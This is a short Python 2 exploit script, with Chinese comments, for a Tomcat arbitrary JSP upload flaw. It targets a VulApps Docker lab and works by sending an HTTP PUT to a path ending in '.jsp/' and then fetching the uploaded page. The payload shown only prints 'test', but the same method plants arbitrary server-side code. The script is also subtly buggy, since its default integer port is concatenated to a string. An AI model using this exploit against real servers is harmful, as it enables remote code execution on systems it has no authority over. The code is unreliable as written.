#!/usr/bin/env python
# -*- coding:utf-8 -*-
#python version 2.7.14
#简介：
#脚本适用于docker下的vulapps环境，使用docker run -d -p 8011:8080 medicean/vulapps:t_tomcat_1启动环境
#具体信息参见github地址
#https://github.com/Medicean/VulApps/tree/master/t/tomcat/1
#此处ip地址为：192.168.109.142





import urllib2
from cookielib import CookieJar
import sys

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.142"
port = 8011

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
url = "http://"+ip+":"+port+"/123.jsp/"
values = '<%out.println("test");%>'
request = urllib2.Request(url,values)
request.get_method = lambda:'PUT'
request = urllib2.urlopen(request)
c = CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(c))
response = opener.open("http://"+ip+":"+port+"/123.jsp")
content = response.read()
print content
